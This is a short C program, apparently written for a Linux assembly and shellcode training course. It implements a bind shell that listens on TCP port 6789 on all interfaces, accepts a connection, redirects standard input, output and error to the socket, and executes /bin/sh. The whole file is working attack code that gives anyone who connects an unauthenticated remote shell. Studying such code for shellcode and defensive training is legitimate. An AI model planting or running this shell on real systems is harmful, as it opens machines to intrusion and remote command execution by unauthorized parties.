/**
 * \brief Creates a local bind shell on port 6789 that spawns /bin/sh
 * \details This was created as part of the SecurityTube Linux Assembly Expert
 * course at http://securitytube-training.com/online-courses/securitytube-linux-assembly-expert/
 * \author Travis Mathison
 * \copyright
 *
 * The MIT License (MIT)
 * 
 * Copyright (c) 2018 Travis Mathison
 *
 * Permission is hereby granted, free of charge, to any person obtaining a copy
 * of this software and associated documentation files (the "Software"), to deal
 * in the Software without restriction, including without limitation the rights
 * to use, copy, modify, merge, publish, distribute, sublicense, and/or sell
 * copies of the Software, and to permit persons to whom the Software is
 * furnished to do so, subject to the following conditions:
 *
 * The above copyright notice and this permission notice shall be included in all
 * copies or substantial portions of the Software.
 *
 * THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR
 * IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,
 * FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE
 * AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER
 * LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM,
 * OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN THE
 * SOFTWARE.
 */
#include <sys/types.h>
#include <sys/socket.h>
#include <netinet/in.h>

#define NULL 0

int socket(int domain, int type, int protocol);
int bind(int sockfd, const struct sockaddr *addr, socklen_t addrlen);
int listen(int sockfd, int backlog);
int accept(int sockfd, struct sockaddr *addr, socklen_t *addrlen);
int dup2(int oldfd, int newfd);
int close(int fd);
int execve(const char *filename, char *const argv[], char *const envp[]);

int main() {
    int port = 6789;
    
    /* this creates a new socket but it has no address assigned to it yet */
    int sockfd = socket(AF_INET /* 2 */, SOCK_STREAM /* 1 */, 0);

    /* create sockaddr structure for use with bind function */
    struct sockaddr_in hostaddr;
    hostaddr.sin_family = AF_INET;
    hostaddr.sin_port = htons(port);
    hostaddr.sin_addr.s_addr = htonl(INADDR_ANY);
    
    /* bind socket to ip/port */
    bind(sockfd, (struct sockaddr*)&hostaddr, sizeof(struct sockaddr_in));

    /* listen for connections */
    listen(sockfd, 1);

    /* accept connection */
    int clientfd = accept(sockfd, NULL, NULL);

    /* duplicate file descriptors for STDIN/STDOUT/STDERR */
    for (int n = 0; n <= 2; ++n) {
        dup2(clientfd, n);
    }

    /* execute /bin/sh */
    execve("/bin/sh", NULL, NULL);

    close(sockfd);

    return 0;
}

